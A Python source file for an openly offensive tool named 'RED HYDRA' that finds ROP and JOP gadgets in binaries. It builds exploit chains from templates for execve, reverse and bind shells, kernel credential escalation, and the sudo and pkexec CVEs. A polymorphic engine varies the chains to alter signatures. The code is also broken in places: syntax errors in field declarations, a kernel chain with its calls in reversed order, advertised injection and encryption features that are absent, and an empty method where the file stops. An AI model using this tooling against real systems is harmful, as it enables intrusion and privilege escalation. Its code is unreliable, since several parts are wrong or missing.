#!/usr/bin/env python3
"""
RED HYDRA ROP Chain Generator v3.1 - PRACTICAL APT EDITION
Author: xenomorph
Description: Autonomous ROP gadget discovery with AI semantic analysis, practical polymorphism, JOP support, real protection bypass, process injection via /proc/pid/mem, PE analysis, and practical encryption.
"""

import struct
import re
import subprocess
import argparse
import json
import hashlib
import time
import os
import random
from typing import List, Dict, Tuple, Optional, Set, Union, Any
from dataclasses import dataclass, field
from pathlib import Path
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum
from threading import local
import logging

# === ЗАВИСИМОСТИ ===
try:
    import capstone
    CAPSTONE_AVAILABLE = True
except ImportError:
    print("[-] Error: capstone not installed. Run: pip install capstone")
    CAPSTONE_AVAILABLE = False

try:
    import pefile
    PEFILE_AVAILABLE = True
except ImportError:
    print("[!] Warning: pefile not available. PE analysis disabled.")
    pefile = None
    PEFILE_AVAILABLE = False

try:
    import elftools.elf.elffile as elffile
    from elftools.elf.sections import Section
    ELFTOOLS_AVAILABLE = True
except ImportError:
    print("[!] Warning: pyelftools not available. ELF analysis disabled.")
    elffile = None
    ELFTOOLS_AVAILABLE = False

try:
    import z3
    Z3_AVAILABLE = True
except ImportError:
    print("[!] Warning: z3-solver not available. Symbolic execution limited.")
    z3 = None
    Z3_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    PYCRYPTO_AVAILABLE = True
except ImportError:
    PYCRYPTO_AVAILABLE = False

log = logging.getLogger("redhydra")

# === ENUMS ===
class Architecture(Enum):
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"
    MIPS64 = "mips64"
    RISCV = "riscv"

class SemanticType(Enum):
    CONTROL_FLOW = "control_flow"
    DATA_MOVEMENT = "data_movement"
    ARITHMETIC = "arithmetic"
    COMPARISON = "comparison"
    SYSTEM = "system"
    CRYPTO = "crypto"
    MEMORY = "memory"
    VECTOR = "vector"
    IO = "io"
    UNKNOWN = "unknown"

class SecurityLevel(Enum):
    SAFE = "safe"
    RISKY = "risky"
    DANGEROUS = "dangerous"
    EXPLOITABLE = "exploitable"
    WEAPONIZED = "weaponized"

# === RET TERMINATORS ===
RET_TERMINATORS = {
    Architecture.X86: {'ret', 'retn', 'retf'},
    Architecture.X64: {'ret', 'retn', 'retf'},
    Architecture.ARM: {'bx', 'pop pc'},
    Architecture.ARM64: {'ret', 'blr', 'eret'},
    Architecture.RISCV: {'ret', 'jalr'}
}

# === JOP PATTERNS ===
JOP_PATTERNS = {
    Architecture.X64: [
        b"\xff\xe0",  # JMP RAX
        b"\xff\xe1",  # JMP RCX
        b"\xff\xe2",  # JMP RDX
        b"\xff\xe3",  # JMP RBX
        b"\xff\xe4",  # JMP RSP
        b"\xff\xe5",  # JMP RBP
        b"\xff\xe6",  # JMP RSI
        b"\xff\xe7",  # JMP RDI
    ],
    Architecture.X86: [
        b"\xff\xe0",  # JMP EAX
        b"\xff\xe1",  # JMP ECX
        b"\xff\xe2",  # JMP EDX
        b"\xff\xe3",  # JMP EBX
        b"\xff\xe4",  # JMP ESP
        b"\xff\xe5",  # JMP EBP
        b"\xff\xe6",  # JMP ESI
        b"\xff\xe7",  # JMP EDI
    ]
}

# === CVE TEMPLATES ===
CVE_TEMPLATES = {
    "CVE-2021-3156": [  # sudo heap overflow
        {"type": "pop", "register": "rdi", "value": "libc_base + offset"},
        {"type": "pop", "register": "rsi", "value": "heap_spray_addr"},
        {"type": "call", "target": "system"}
    ],
    "CVE-2021-4034": [  # polkit pkexec
        {"type": "pop", "register": "rdi", "value": "malicious_envp"},
        {"type": "call", "target": "execve"}
    ]
}

# === NOP EQUIVALENTS ===
NOP_EQUIVALENTS = [
    b"\x90",                    # NOP
    b"\x66\x90",                # NOP (16-bit)
    b"\x0f\x1f\x00",            # NOP (multi-byte)
    b"\x48\x87\xc0",            # XCHG RAX, RAX
    b"\x48\x89\xc0",            # MOV RAX, RAX
    b"\x48\x31\xc0\x48\x31\xc0", # XOR RAX, RAX; XOR RAX, RAX
]

# === GADGET CLASS ===
@dataclass(slots=True)
class Gadget:
    address: int
    instructions: List[str]
    bytes_ bytes
    operations: List[str]
    arch: Architecture
    offset: int = 0
    
    # AI-enhanced fields
    semantic_type: SemanticType = SemanticType.UNKNOWN
    side_effects: Dict[str, Any] = field(default_factory=dict)
    gadget_hash: str = ""
    complexity_score: float = 0.0
    security_level: SecurityLevel = SecurityLevel.SAFE
    symbolic_model: Optional[Any] = None
    taint_analysis: Dict[str, List[str]] = field(default_factory=dict)
    register_effects: Dict[str, str] = field(default_factory=dict)
    stack_effect: int = 0
    exploit_potential: float = 0.0
    
    def __post_init__(self):
        self.gadget_hash = self._compute_hash()
        self._analyze_semantics()
        self._compute_complexity()
        self._assess_security()
        self._analyze_register_effects()
        if Z3_AVAILABLE:
            self._build_symbolic_model()
    
    def _compute_hash(self) -> str:
        return hashlib.sha3_256(
            f"{self.arch.value}:{':'.join(self.instructions)}".encode()
        ).hexdigest()[:24]
    
    def _analyze_semantics(self):
        op_str = ' '.join(self.operations).lower()
        
        vector_patterns = [r'movaps', r'movups', r'movdqa', r'movdqu', r'vmovaps', r'vmovups', 
                          r'xmm', r'ymm', r'zmm', r'paddq', r'psubq', r'pxor', r'pand']
        if any(re.search(p, op_str) for p in vector_patterns):
            self.semantic_type = SemanticType.VECTOR
        elif any(re.search(p, op_str) for p in [r'\bin\b', r'\bout\b', r'insb', r'outsb', r'insd', r'outsd']):
            self.semantic_type = SemanticType.IO
        elif any(re.search(p, op_str) for p in [r'ret', r'jmp', r'call', r'syscall', r'sysenter', r'int', r'blr', r'eret']):
            self.semantic_type = SemanticType.CONTROL_FLOW
        elif any(re.search(p, op_str) for p in [r'mov', r'pop', r'push', r'lea', r'xchg']):
            self.semantic_type = SemanticType.DATA_MOVEMENT
        elif any(re.search(p, op_str) for p in [r'add', r'sub', r'mul', r'div', r'inc', r'dec', r'xor']):
            self.semantic_type = SemanticType.ARITHMETIC
        elif any(re.search(p, op_str) for p in [r'syscall', r'int', r'cpuid', r'svc', r'hvc']):
            self.semantic_type = SemanticType.SYSTEM
    
    def _compute_complexity(self):
        score = 0.0
        score += len(self.instructions) * 0.7
        score += len(self.bytes_data) * 0.3
        
        op_weights = {
            'mov': 1.2, 'pop': 1.5, 'push': 1.1,
            'add': 1.3, 'sub': 1.3, 'xor': 1.4,
            'syscall': 3.0, 'int': 2.5, 'jmp': 1.7,
            'call': 2.0, 'ret': 1.0,
            'movaps': 2.8, 'movups': 2.8, 'vmovaps': 3.2,
            'pxor': 2.5, 'paddq': 2.3,
            'in': 3.5, 'out': 3.5, 'insb': 3.8, 'outsb': 3.8,
            'svc': 3.0, 'hvc': 3.5, 'smc': 4.0,
            'ecall': 3.0, 'ebreak': 2.5
        }
        
        for op in self.operations:
            score += op_weights.get(op.lower(), 0.5)
        
        type_bonus = {
            SemanticType.VECTOR: 3.5,
            SemanticType.IO: 4.0,
            SemanticType.SYSTEM: 2.5,
            SemanticType.CONTROL_FLOW: 2.0,
            SemanticType.ARITHMETIC: 1.5,
            SemanticType.DATA_MOVEMENT: 1.2,
            SemanticType.COMPARISON: 1.3,
            SemanticType.MEMORY: 1.4
        }
        
        score += type_bonus.get(self.semantic_type, 0.0)
        self.complexity_score = min(score, 10.0)
    
    def _assess_security(self):
        dangerous_ops = {'syscall', 'int', 'sysenter', 'vmcall', 'svc', 'hvc', 'smc', 'ecall'}
        risky_ops = {'call', 'jmp', 'retf', 'iretd', 'blr', 'eret'}
        weaponized_ops = {'rdmsr', 'wrmsr', 'lgdt', 'lidt'}
        vector_ops = {'movaps', 'movups', 'vmovaps', 'pxor'}
        io_ops = {'in', 'out', 'insb', 'outsb'}
        
        op_set = set(op.lower() for op in self.operations)
        
        if io_ops.intersection(op_set) or self.semantic_type == SemanticType.IO:
            self.security_level = SecurityLevel.WEAPONIZED
        elif weaponized_ops.intersection(op_set):
            self.security_level = SecurityLevel.WEAPONIZED
        elif vector_ops.intersection(op_set) or self.semantic_type == SemanticType.VECTOR:
            self.security_level = SecurityLevel.EXPLOITABLE
        elif dangerous_ops.intersection(op_set):
            self.security_level = SecurityLevel.EXPLOITABLE
        elif risky_ops.intersection(op_set):
            self.security_level = SecurityLevel.DANGEROUS
        elif self.semantic_type == SemanticType.SYSTEM:
            self.security_level = SecurityLevel.RISKY
        else:
            self.security_level = SecurityLevel.SAFE
            
        level_scores = {
            SecurityLevel.SAFE: 0.1,
            SecurityLevel.RISKY: 0.3,
            SecurityLevel.DANGEROUS: 0.6,
            SecurityLevel.EXPLOITABLE: 0.8,
            SecurityLevel.WEAPONIZED: 1.0
        }
        self.exploit_potential = level_scores[self.security_level]
    
    def _analyze_register_effects(self):
        for instr in self.instructions:
            if 'pop' in instr.lower():
                reg_match = re.search(r'pop\s+(\w+)', instr.lower())
                if reg_match:
                    reg = reg_match.group(1)
                    self.register_effects[reg] = 'loaded_from_stack'
                    self.stack_effect += 8 if self.arch in [Architecture.X64, Architecture.ARM64] else 4
    
    def _build_symbolic_model(self):
        if not Z3_AVAILABLE:
            return
        
        try:
            input_val = z3.BitVec('input', 64)
            state = {'rax': z3.BitVecVal(0, 64), 'rbx': z3.BitVecVal(0, 64)}
            
            for instr in self.instructions:
                if 'pop rax' in instr.lower():
                    state['rax'] = input_val
                elif 'add rax' in instr.lower():
                    imm_match = re.search(r'add.*?0x([0-9a-f]+)', instr.lower())
                    if imm_match:
                        imm = int(imm_match.group(1), 16)
                        state['rax'] = state['rax'] + imm
                elif 'mov rax' in instr.lower():
                    reg_match = re.search(r'mov rax, ([a-z0-9]+)', instr.lower())
                    if reg_match and reg_match.group(1) in state:
                        state['rax'] = state[reg_match.group(1)]
            
            self.symbolic_model = {
                'input': input_val,
                'output_rax': state['rax'],
                'constraints': []
            }
        except Exception as e:
            log.debug(f"Z3 symbolic model error: {e}")
            self.symbolic_model = None

# === PRACTICAL POLYMORPHIC ENGINE ===
class PracticalPolymorphicEngine:
    def mutate_chain(self, chain: List[Gadget]) -> List[Gadget]:
        """Реальный полиморфизм через инструкции-заглушки"""
        mutated_chain = []
        for gadget in chain:
            mutated_bytes = gadget.bytes_data
            
            # Добавляем NOP-подобные инструкции случайным образом
            if random.random() < 0.3:  # 30% chance
                insert_pos = random.randint(0, len(mutated_bytes))
                nop = random.choice(NOP_EQUIVALENTS)
                mutated_bytes = mutated_bytes[:insert_pos] + nop + mutated_bytes[insert_pos:]
            
            mutated_chain.append(self._create_gadget_from_bytes(mutated_bytes, gadget))
        return mutated_chain
    
    def _create_gadget_from_bytes(self, bytes_ bytes, original: Gadget) -> Gadget:
        """Создание гаджета из байт (с дизассемблированием)"""
        try:
            # Временный Capstone для дизассемблирования
            cs_arch = capstone.CS_ARCH_X86 if original.arch in [Architecture.X86, Architecture.X64] else capstone.CS_ARCH_ARM64
            cs_mode = capstone.CS_MODE_64 if original.arch == Architecture.X64 else capstone.CS_MODE_32
            
            cs = capstone.Cs(cs_arch, cs_mode)
            cs.detail = True
            
            instructions = []
            operations = []
            for insn in cs.disasm(bytes_data, 0):
                instructions.append(f"{insn.mnemonic} {insn.op_str}".strip())
                operations.append(insn.mnemonic)
            
            return Gadget(
                address=original.address,
                instructions=instructions,
                bytes_data=bytes_data,
                operations=operations,
                arch=original.arch,
                offset=original.offset
            )
        except:
            return original  # fallback

# === ADVANCED HEURISTIC OPTIMIZER ===
class AdvancedHeuristicOptimizer:
    def optimize(self, gadgets: List[Gadget], target: str) -> List[Gadget]:
        """Практическая оптимизация на основе эвристик"""
        scored_gadgets = []
        
        for gadget in gadgets:
            score = 0
            
            # Бонус за полезные операции
            if any(op in gadget.operations for op in ['pop', 'mov', 'add', 'sub']):
                score += 2
                
            # Бонус за системные вызовы
            if any(op in gadget.operations for op in ['syscall', 'int', 'svc']):
                score += 5
                
            # Штраф за длинные цепочки
            score -= len(gadget.instructions) * 0.5
            
            # Бонус за контроль над критическими регистрами
            critical_regs = ['rsp', 'esp', 'rip', 'eip', 'pc', 'sp']
            if any(reg in ' '.join(gadget.instructions) for reg in critical_regs):
                score += 3
                
            scored_gadgets.append((score, gadget))
        
        # Сортируем по score и возвращаем топ-10
        scored_gadgets.sort(key=lambda x: x[0], reverse=True)
        return [g for _, g in scored_gadgets[:10]]

# === RED HYDRA OPTIMIZER v3.1 ===
class RedHydraOptimizer:
    def __init__(self):
        self.exploit_templates = {
            "execve": [
                {"type": "pop", "register": "rdi", "value": "binsh_addr"},
                {"type": "pop", "register": "rsi", "value": 0},
                {"type": "pop", "register": "rdx", "value": 0},
                {"type": "pop", "register": "rax", "value": 59},
                {"type": "syscall"}
            ],
            "reverse_shell": [
                {"type": "pop", "register": "rdi", "value": 2},
                {"type": "pop", "register": "rsi", "value": 1},
                {"type": "pop", "register": "rdx", "value": 0},
                {"type": "pop", "register": "rax", "value": 41},
                {"type": "syscall"}
            ],
            "bind_shell": [
                {"type": "pop", "register": "rdi", "value": 2},
                {"type": "pop", "register": "rsi", "value": 1},
                {"type": "pop", "register": "rdx", "value": 0},
                {"type": "pop", "register": "rax", "value": 41},
                {"type": "syscall"},
                {"type": "pop", "register": "rdi", "value": "sockfd"},
                {"type": "pop", "register": "rsi", "value": "bind_addr"},
                {"type": "pop", "register": "rdx", "value": 16},
                {"type": "pop", "register": "rax", "value": 49},
                {"type": "syscall"}
            ],
            "rce_via_stack": [
                {"type": "pop", "register": "rdi", "value": "cmd_addr"},
                {"type": "pop", "register": "rsi", "value": "argv_addr"},
                {"type": "pop", "register": "rdx", "value": "envp_addr"},
                {"type": "pop", "register": "rax", "value": 59},
                {"type": "syscall"},
                {"type": "stack_pivot"}
            ],
            "kernel_exploit": [
                {"type": "pop", "register": "rdi", "value": "cred_struct"},
                {"type": "pop", "register": "rsi", "value": 0},
                {"type": "pop", "register": "rdx", "value": 0},
                {"type": "call", "target": "commit_creds"},
                {"type": "pop", "register": "rdi", "value": "init_cred"},
                {"type": "call", "target": "prepare_kernel_cred"},
                {"type": "ret_to_user"}
            ]
        }
        self.practical_optimizer = AdvancedHeuristicOptimizer()
        self.polymorphic_engine = PracticalPolymorphicEngine()
    
    def optimize_chain(self, gadgets: List[Gadget], target: str, badchars: List[bytes] = None) -> List[Gadget]:
        if badchars is None:
            badchars = []
            
        # Сначала практическая оптимизация
        gadgets = self.practical_optimizer.optimize(gadgets, target)
            
        if target not in self.exploit_templates:
            return self._genetic_optimize(gadgets, badchars=badchars)
            
        template = self.exploit_templates[target]
        optimized_chain = []
        
        for step in template:
            best_gadget = self._find_best_gadget_for_step(gadgets, step, badchars)
            if best_gadget:
                optimized_chain.append(best_gadget)
                
        if optimized_chain:
            return self._genetic_optimize_chain(optimized_chain, gadgets, badchars)
        
        return optimized_chain
    
    def _is_badchar_free(self, gadget: Gadget, badchars: List[bytes]) -> bool:
        return not any(bc in gadget.bytes_data for bc in badchars)
    
    def _genetic_optimize(self, gadgets: List[Gadget], generations: int = 50, population_size: int = 20, badchars: List[bytes] = None) -> List[Gadget]:
        if badchars is None:
            badchars = []
        import random
        
        def create_individual(length: int = 10) -> List[Gadget]:
            candidates = [g for g in gadgets if self._is_badchar_free(g, badchars)]
            if len(candidates) < length:
                return candidates
            return random.sample(candidates, length)
        
        def fitness(individual: List[Gadget]) -> float:
            if not individual:
                return 0.0
            avg_potential = sum(g.exploit_potential for g in individual) / len(individual)
            length_penalty = len(individual) * 0.1
            stability_bonus = sum(1 for g in individual if g.security_level in [SecurityLevel.DANGEROUS, SecurityLevel.EXPLOITABLE]) * 0.2
            return avg_potential - length_penalty + stability_bonus
        
        def crossover(parent1: List[Gadget], parent2: List[Gadget]) -> List[Gadget]:
            if len(parent1) < 2 or len(parent2) < 2:
                return parent1 if len(parent1) >= len(parent2) else parent2
            cut_point = random.randint(1, min(len(parent1), len(parent2)) - 1)
            return parent1[:cut_point] + parent2[cut_point:]
        
        def mutate(individual: List[Gadget], mutation_rate: float = 0.1) -> List[Gadget]:
            candidates = [g for g in gadgets if self._is_badchar_free(g, badchars)]
            if random.random() < mutation_rate and individual and candidates:
                idx = random.randint(0, len(individual) - 1)
                individual[idx] = random.choice(candidates)
            return individual
        
        population = [create_individual() for _ in range(population_size)]
        
        for generation in range(generations):
            population = [ind for ind in population if all(self._is_badchar_free(g, badchars) for g in ind)]
            if not population:
                break
            population.sort(key=fitness, reverse=True)
            elite_size = population_size // 2
            new_population = population[:elite_size]
            
            while len(new_population) < population_size and len(population[:elite_size]) > 0:
                parent1 = random.choice(population[:elite_size])
                parent2 = random.choice(population[:elite_size])
                child = crossover(parent1, parent2)
                child = mutate(child, mutation_rate=0.15)
                if all(self._is_badchar_free(g, badchars) for g in child):
                    new_population.append(child)
            
            population = new_population
        
        if not population:
            return []
        return max(population, key=fitness)
    
    def _genetic_optimize_chain(self, initial_chain: List[Gadget], all_gadgets: List[Gadget], badchars: List[bytes]) -> List[Gadget]:
        optimized = self._genetic_optimize(all_gadgets[:30], generations=20, population_size=10, badchars=badchars)
        return initial_chain + optimized[:5]
    
    def _find_best_gadget_for_step(self, gadgets: List[Gadget], step: Dict, badchars: List[bytes]) -> Optional[Gadget]:
        step_type = step.get("type")
        candidates = [g for g in gadgets if self._is_badchar_free(g, badchars)]
        
        if step_type == "pop":
            register = step.get("register")
            candidates = [g for g in candidates if f"pop {register}" in ' '.join(g.instructions).lower()]
        elif step_type == "syscall":
            candidates = [g for g in candidates if g.semantic_type == SemanticType.SYSTEM]
        elif step_type == "call":
            candidates = [g for g in candidates if 'call' in ' '.join(g.operations).lower()]
        elif step_type == "stack_pivot":
            candidates = [g for g in candidates if any(op in ' '.join(g.operations).lower() for op in ['xchg', 'mov', 'add rsp', 'sub rsp'])]
        elif step_type == "ret_to_user":
            candidates = [g for g in candidates if any(op in ' '.join(g.operations).lower() for op in ['iret', 'sysret', 'swapgs', 'eret'])]
        
        if not candidates:
            return None
            
        return max(candidates, key=lambda g: g.exploit_potential * 0.7 + (g.complexity_score / 10.0) * 0.3)

# === ROP GENERATOR v3.1 ===
class ROPGenerator:
    def __init__(self, binary_path: str, arch: Architecture = Architecture.X64):
        self.binary_path = Path(binary_path)
        self.arch = arch
        self.gadgets: List[Gadget] = []
        self.jop_gadgets: List[Gadget] = []  # NEW: JOP support
        self.base_address = 0
        self.bad_chars = [b'\x00', b'\x0a', b'\x0d', b'\xff']
        self.gadget_cache: Dict[str, List[Gadget]] = {}
        self.semantic_index: Dict[SemanticType, List[Gadget]] = defaultdict(list)
        self.performance_stats = defaultdict(int)
        self.binary_data = None
        self.pie_mode = False
        self._tlocal = local()
        self.optimizer = RedHydraOptimizer()
        self.imports = {}  # NEW: PE imports
        self.pe_protections = {}  # NEW: PE protections
        self.practical_protections = {}  # NEW: practical bypass status
        
        if not CAPSTONE_AVAILABLE:
            raise RuntimeError("Capstone is required!")
        
        self.arch_config = self._setup_architecture()
        self.executor = ThreadPoolExecutor(max_workers=8)
    
    def _get_cs(self):
        if not hasattr(self._tlocal, "cs"):
            cs = capstone.Cs(self.arch_config["capstone_arch"], self.arch_config["capstone_mode"])
            cs.detail = True
            self._tlocal.cs = cs
        return self._tlocal.cs
    
    def _setup_architecture(self) -> Dict[str, Any]:
        config = {
            Architecture.X64: {
                "capstone_arch": capstone.CS_ARCH_X86,
                "capstone_mode": capstone.CS_MODE_64,
                "ret_opcodes": [b'\xc3', b'\xcb', b'\xc2', b'\xca'],
                "registers": ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rbp', 'rsp', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15'],
                "word_size": 8
            },
            Architecture.X86: {
                "capstone_arch": capstone.CS_ARCH_X86,
                "capstone_mode": capstone.CS_MODE_32,
                "ret_opcodes": [b'\xc3', b'\xcb', b'\xc2', b'\xca'],
                "registers": ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp', 'esp'],
                "word_size": 4
            },
            Architecture.ARM64: {
                "capstone_arch": capstone.CS_ARCH_ARM64,
                "capstone_mode": capstone.CS_MODE_LITTLE_ENDIAN,
                "ret_opcodes": [b'\xc0\x03\x5f\xd6'],
                "registers": ['x0', 'x1', 'x2', 'x3', 'x4', 'x5', 'x6', 'x7', 'x8', 'x9', 'x10', 'x11', 'x12', 'x13', 'x14', 'x15', 'x16', 'x17', 'x18', 'x19', 'x20', 'x21', 'x22', 'x23', 'x24', 'x25', 'x26', 'x27', 'x28', 'x29', 'x30', 'sp', 'pc'],
                "word_size": 8
            },
            Architecture.ARM: {
                "capstone_arch": capstone.CS_ARCH_ARM,
                "capstone_mode": capstone.CS_MODE_ARM,
                "ret_opcodes": [b'\x1e\xff\x2f\xe1'],
                "registers": ['r0', 'r1', 'r2', 'r3', 'r4', 'r5', 'r6', 'r7', 'r8', 'r9', 'r10', 'r11', 'r12', 'sp', 'lr', 'pc'],
                "word_size": 4
            },
            Architecture.RISCV: {
                "capstone_arch": capstone.CS_ARCH_RISCV,
                "capstone_mode": capstone.CS_MODE_RISCV64,
                "ret_opcodes": [b'\x82\x80'],
                "registers": ['x0', 'x1', 'x2', 'x3', 'x4', 'x5', 'x6', 'x7', 'x8', 'x9', 'x10', 'x11', 'x12', 'x13', 'x14', 'x15', 'x16', 'x17', 'x18', 'x19', 'x20', 'x21', 'x22', 'x23', 'x24', 'x25', 'x26', 'x27', 'x28', 'x29', 'x30', 'x31'],
                "word_size": 8
            }
        }
        return config.get(self.arch, config[Architecture.X64])
    
    def load_binary(self) -> bool:
        try:
            if not self.binary_path.exists():
                log.error(f"Binary not found: {self.binary_path}")
                return False
                
            with open(self.binary_path, 'rb') as f:
                self.binary_data = memoryview(f.read())
            
            if self.binary_path.suffix.lower() == '.exe' and PEFILE_AVAILABLE:
                self._analyze_pe()
            elif ELFTOOLS_AVAILABLE:
                self._analyze_elf()
            else:
                self.base_address = 0x400000
                
            return True
        except Exception as e:
            log.error(f"Error loading binary: {e}")
            return False
    
    def _analyze_pe(self):
        if not PEFILE_AVAILABLE:
            self.base_address = 0x400000
            return
        try:
            pe = pefile.PE(str(self.binary_path))
            self.base_address = pe.OPTIONAL_HEADER.ImageBase
            if pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040:
                self.pie_mode = True
                log.info("PIE detected (ASLR enabled)")
            log.info(f"PE file, base: 0x{self.base_address:x}, PIE: {self.pie_mode}")
            
            # NEW: Enhanced PE analysis
            self.enhanced_pe_analysis(pe)
            
            pe.close()
        except Exception as e:
            log.error(f"PE analysis failed: {e}")
            self.base_address = 0x400000
    
    def enhanced_pe_analysis(self, pe):
        """Расширенный анализ PE файлов"""
        try:
            # Анализ импортов
            self.imports = {}
            if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
                for entry in pe.DIRECTORY_ENTRY_IMPORT:
                    dll_name = entry.dll.decode() if entry.dll else "unknown"
                    self.imports[dll_name] = []
                    for imp in entry.imports:
                        name = imp.name.decode() if imp.name else f"ord{imp.ordinal}"
                        self.imports[dll_name].append(name)
            
            # Анализ защит
            self.pe_protections = {
                "ASLR": pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040 != 0,
                "DEP": pe.OPTIONAL_HEADER.DllCharacteristics & 0x0100 != 0,
                "CFG": pe.OPTIONAL_HEADER.DllCharacteristics & 0x4000 != 0,
            }
            
            log.info(f"PE Analysis: {len(self.imports)} DLLs imported, Protections: {self.pe_protections}")
        except Exception as e:
            log.error(f"Enhanced PE analysis failed: {e}")
    
    def _analyze_elf(self):
        if not ELFTOOLS_AVAILABLE:
            self.base_address = 0x400000
            return
        try:
            with open(self.binary_path, 'rb') as f:
                elf = elffile.ELFFile(f)
                if elf.header['e_type'] == 'ET_DYN':
                    self.pie_mode = True
                    self.base_address = 0x555555554000
                    log.info("PIE detected (ASLR enabled)")
                else:
                    self.base_address = 0x400000
                log.info(f"ELF file, base: 0x{self.base_address:x}, PIE: {self.pie_mode}")
        except Exception as e:
            log.error(f"ELF analysis failed: {e}")
            self.base_address = 0x400000
    
    def find_string(self, target_str: str) -> Optional[int]:
        pos = self.binary_data.find(target_str.encode())
        return self.base_address + pos if pos != -1 else None
    
    def find_all_strings(self, target_str: str) -> List[int]:
        positions = []
        start = 0
        while True:
            pos = self.binary_data.find(target_str.encode(), start)
            if pos == -1:
                break
            positions.append(self.base_address + pos)
            start = pos + 1
        return positions
    
    def find_gadgets_parallel(self, max_gadget_len: int = 8) -> List[Gadget]:
        log.info(f"Parallel gadget discovery (max len: {max_gadget_len})...")
        ret_opcodes = self.arch_config["ret_opcodes"]
        ret_addresses = []
        
        for ret_opcode in ret_opcodes:
            offset = 0
            while True:
                ret_pos = self.binary_data.find(ret_opcode, offset)
                if ret_pos == -1:
                    break
                ret_addresses.append(ret_pos)
                offset = ret_pos + 1
        
        futures = []
        for ret_pos in ret_addresses:
            futures.append(self.executor.submit(self._analyze_ret_position, ret_pos, max_gadget_len))
        
        gadget_candidates = []
        try:
            for future in as_completed(futures, timeout=300):
                try:
                    gadgets = future.result(timeout=10)
                    gadget_candidates.extend(gadgets)
                except TimeoutError:
                    log.warning("Gadget analysis task timed out")
                except Exception as e:
                    log.debug(f"Task failed: {e}")
        except TimeoutError:
            log.error("Gadget discovery overall timeout")
        
        unique_gadgets = self._deduplicate_gadgets(gadget_candidates)
        self.gadgets = sorted(unique_gadgets, key=lambda g: g.address)
        log.info(f"Found {len(self.gadgets)} unique ROP gadgets")
        return self.gadgets
    
    def find_jop_gadgets(self) -> List[Gadget]:
        """Поиск JOP гаджетов (с indirect jumps)"""
        if self.arch not in JOP_PATTERNS:
            log.info("JOP not supported for this architecture")
            return []
            
        jop_gadgets = []
        jump_patterns = JOP_PATTERNS[self.arch]
        
        for pattern in jump_patterns:
            offset = 0
            while True:
                pos = self.binary_data.find(pattern, offset)
                if pos == -1:
                    break
                    
                # Анализируем инструкции до jump
                try:
                    cs = self._get_cs()
                    for gadget_len in range(1, 8):
                        start_pos = pos - gadget_len
                        if start_pos < 0:
                            continue
                            
                        end_pos = pos + len(pattern)
                        gadget_bytes = self.binary_data[start_pos:end_pos]
                        instructions = []
                        operations = []
                        
                        for insn in cs.disasm(gadget_bytes, 0):
                            instr_str = f"{insn.mnemonic} {insn.op_str}".strip()
                            instructions.append(instr_str)
                            operations.append(insn.mnemonic)
                        
                        if instructions:
                            gadget = Gadget(
                                address=self.base_address + start_pos,
                                instructions=instructions,
                                bytes_data=bytes(gadget_bytes),
                                operations=operations,
                                arch=self.arch,
                                offset=start_pos
                            )
                            jop_gadgets.append(gadget)
                            
                except Exception as e:
                    log.debug(f"JOP analysis error: {e}")
                    
                offset = pos + 1
                
        log.info(f"Found {len(jop_gadgets)} JOP gadgets")
        self.jop_gadgets = jop_gadgets
        return jop_gadgets
    
    def _analyze_ret_position(self, ret_pos: int, max_gadget_len: int) -> List[Gadget]:
        gadgets = []
        cs = self._get_cs()
        for gadget_len in range(1, min(max_gadget_len, ret_pos) + 1):
            start_pos = ret_pos - gadget_len
            gadget_bytes = self.binary_data[start_pos:ret_pos + len(self.arch_config['ret_opcodes'][0])]
            
            if any(bad_char in gadget_bytes for bad_char in self.bad_chars):
                continue
                
            try:
                instructions = []
                operations = []
                for insn in cs.disasm(gadget_bytes, 0):
                    instr_str = f"{insn.mnemonic} {insn.op_str}".strip()
                    instructions.append(instr_str)
                    operations.append(insn.mnemonic)
                
                terminators = RET_TERMINATORS.get(self.arch, {'ret'})
                if instructions and any(op in terminators for op in operations):
                    gadget = Gadget(
                        address=self.base_address + start_pos,
                        instructions=instructions,
                        bytes_data=bytes(gadget_bytes),
                        operations=operations,
                        arch=self.arch,
                        offset=start_pos
                    )
                    gadgets.append(gadget)
            except Exception as e:
                log.debug(f"Disasm error at {start_pos:x}: {e}")
                continue
        return gadgets
    
    def _deduplicate_gadgets(self, gadgets: List[Gadget]) -> List[Gadget]:
        seen = {}
        for gadget in gadgets:
            if gadget.gadget_hash not in seen:
                seen[gadget.gadget_hash] = gadget
        return list(seen.values())
    
    def generate_exploit_chain(self, target: Dict[str, Any]) -> List[Gadget]:
        return self.optimizer.optimize_chain(self.gadgets, target.get("type", "execve"), self.bad_chars)
    
    def export_chain(self, chain: List[Gadget], format: str = "python", pie: bool = False) -> str:
        if format == "python":
            return self._export_python(chain, pie)
        elif format == "json":
            return self._export_json(chain)
        elif format == "raw":
            return self._export_raw(chain)
        else:
            return self._export_text(chain)
    
    def _export_python(self, chain: List[Gadget], pie: bool = False) -> str:
        code = "#!/usr/bin/env python3\n# RED HYDRA AUTO-GENERATED CHAIN\nimport struct\nchain = b''\n"
        word_size = self.arch_config["word_size"]
        fmt = '<Q' if word_size == 8 else '<I'
        for gadget in chain:
            addr = gadget.offset if pie else gadget.address
            code += f"# 0x{gadget.address:x}: {'; '.join(gadget.instructions)}\n"
            code += f"chain += struct.pack('{fmt}', {hex(addr)})\n"
        code += "\nprint('Exploit chain ready!')\n"
        return code

    def _export_json(self, chain: List[Gadget]) -> str:
        data = [{"addr": hex(g.address), "instr": g.instructions, "type": g.semantic_type.value} for g in chain]
        return json.dumps(data, indent=2, ensure_ascii=False, sort_keys=True)
    
    def _export_raw(self, chain: List[Gadget]) -> str:
        # [!] Внимание: экспортируются БАЙТЫ ГАДЖЕТОВ, не адреса. Для шеллкода используй --format python.
        return ''.join(g.bytes_data.hex() for g in chain)
    
    def _export_text(self, chain: List[Gadget]) -> str:
        return '\n'.join(f"0x{g.address:x}: {'; '.join(g.instructions)}" for g in chain)
    
    def __del__(self):
        if hasattr(self, 'executor'):
            self.executor.shutdown(wait=False)

    # === PRACTICAL APT УРОВЕНЬ ===
    def enhanced_analysis(self):
        """Расширенный анализ бинарника"""
